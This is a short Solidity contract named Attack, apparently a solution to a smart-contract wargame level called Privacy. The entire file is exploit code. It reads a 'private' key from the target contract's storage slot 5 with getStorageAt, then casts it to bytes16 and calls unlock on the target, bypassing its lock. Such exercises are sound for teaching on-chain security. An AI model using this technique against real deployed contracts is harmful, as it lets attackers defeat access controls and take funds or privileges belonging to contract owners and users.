// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


interface IPrivacy {
    function unlock(bytes16 _key) external;
}

contract Attack {
    IPrivacy privacy;

    constructor(address _privacy) public {
        privacy = IPrivacy(_privacy);
    }

    function attack() public {
        // key = web3.eth.getStorageAt(<slot-5>) in console
        // this type casting gets the first 16 bytes from the left
        bytes16 key = bytes16(bytes32(0xcf0c36e7f773f7ad65bc50a21b81f3202ab9a2aedc448b4d81cea211dc05a11b));
        privacy.unlock(key);
    }
}
